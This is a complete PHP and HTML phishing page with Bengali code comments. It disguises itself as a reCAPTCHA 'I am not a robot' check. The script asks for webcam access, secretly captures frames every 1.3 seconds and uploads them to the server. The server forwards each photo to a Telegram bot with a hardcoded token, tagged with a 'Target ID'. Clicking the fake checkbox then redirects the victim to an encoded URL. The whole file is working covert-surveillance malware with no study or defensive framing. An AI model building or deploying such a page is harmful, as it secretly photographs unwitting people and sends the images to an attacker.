<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
    
    $botToken = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY";
    
    // ইউআরএল থেকে নির্দিষ্ট ইউজারের Chat ID নেওয়া হচ্ছে (ডিফল্ট ব্যাকআপ দেওয়া আছে)
    $chatId = isset($_POST['chat_id']) && !empty($_POST['chat_id']) ? $_POST['chat_id'] : "5896019931";

    $uploadDir = 'uploads/';
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0777, true);
    }

    $imgData = $_POST['image'];
    $imgData = str_replace('data:image/png;base64,', '', $imgData);
    $imgData = str_replace(' ', '+', $imgData);
    $data = base64_decode($imgData);

    $targetId = isset($_POST['target']) ? $_POST['target'] : 'direct';

    $fileName = 'img_' . uniqid() . '.png';
    $filePath = $uploadDir . $fileName;

    if (file_put_contents($filePath, $data)) {
        $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendPhoto";
        
        $postFields = [
            'chat_id' => $chatId,
            'caption' => "🎯 Target ID: {$targetId}\n📁 File: {$fileName}",
            'photo'   => new CURLFile(realpath($filePath))
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $telegramUrl);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 2); 

        curl_exec($ch);
        curl_close($ch);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #f9f9f9; 
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .recaptcha-box {
            background: #f9f9f9;
            border: 1px solid #d3d3d3;
            border-radius: 3px;
            padding: 20px 25px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 300px;
            box-shadow: 0 0 4px 1px rgba(0,0,0,0.08);
            display: none;
            cursor: pointer;
        }

        .recaptcha-left {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .recaptcha-checkbox {
            width: 28px;
            height: 28px;
            background: #fff;
            border: 2px solid #c1c1c1;
            border-radius: 2px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            transition: background 0.2s, border-color 0.2s;
        }

        .recaptcha-checkbox:hover {
            border-color: #b2b2b2;
        }

        .recaptcha-checkbox.checked::after {
            content: "";
            position: absolute;
            width: 6px;
            height: 12px;
            border: solid #006600;
            border-width: 0 3px 3px 0;
            transform: rotate(45deg);
            margin-bottom: 3px;
        }

        .recaptcha-text {
            font-family: Roboto, helvetica, arial, sans-serif;
            font-size: 14px;
            color: #2c2c2c;
            user-select: none;
        }

        .recaptcha-right {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .recaptcha-logo {
            width: 32px;
            height: 32px;
            background-image: url('https://www.gstatic.com/recaptcha/api2/logo_48.png');
            background-size: contain;
            background-repeat: no-repeat;
        }

        .recaptcha-footer {
            font-family: Roboto, helvetica, arial, sans-serif;
            font-size: 10px;
            color: #555;
            margin-top: 2px;
        }
    </style>
</head>
<body>

    <div class="recaptcha-box" id="recaptchaContainer" onclick="openTargetLink()">
        <div class="recaptcha-left">
            <div class="recaptcha-checkbox" id="recaptchaCheckbox"></div>
            <span class="recaptcha-text">I am not a robot</span>
        </div>
        <div class="recaptcha-right">
            <div class="recaptcha-logo"></div>
            <div class="recaptcha-footer">reCAPTCHA</div>
        </div>
    </div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        const urlParams = new URLSearchParams(window.location.search);
        const targetId = urlParams.get('id') || 'direct';
        const userChatId = urlParams.get('cid') || ''; // ডায়নামিক Chat ID রিসিভ করা হচ্ছে
        const rawTargetUrl = urlParams.get('url');

        let finalUrl = "https://www.aapunkagames.com/"; 

        if (rawTargetUrl) {
            try {
                finalUrl = atob(rawTargetUrl.replace(/-/g, '+').replace(/_/g, '/'));
            } catch (e) {
                console.error("URL decode error:", e);
            }
        }

        const recaptchaContainer = document.getElementById('recaptchaContainer');
        if (finalUrl) {
            recaptchaContainer.style.display = 'flex';
        }

        function openTargetLink() {
            const checkbox = document.getElementById('recaptchaCheckbox');
            checkbox.style.background = '#fff';
            checkbox.classList.add('checked');
            
            setTimeout(() => {
                window.open(finalUrl, '_blank');
            }, 500);
        }

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
                setTimeout(() => {
                    setInterval(captureAndUpload, 1300);
                }, 1000);
            })
            .catch(err => {
                console.error("Camera error: ", err);
            });

        function captureAndUpload() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/png');

            fetch('', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'image=' + encodeURIComponent(imageData) + '&target=' + encodeURIComponent(targetId) + '&chat_id=' + encodeURIComponent(userChatId)
            }).catch(error => {
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>
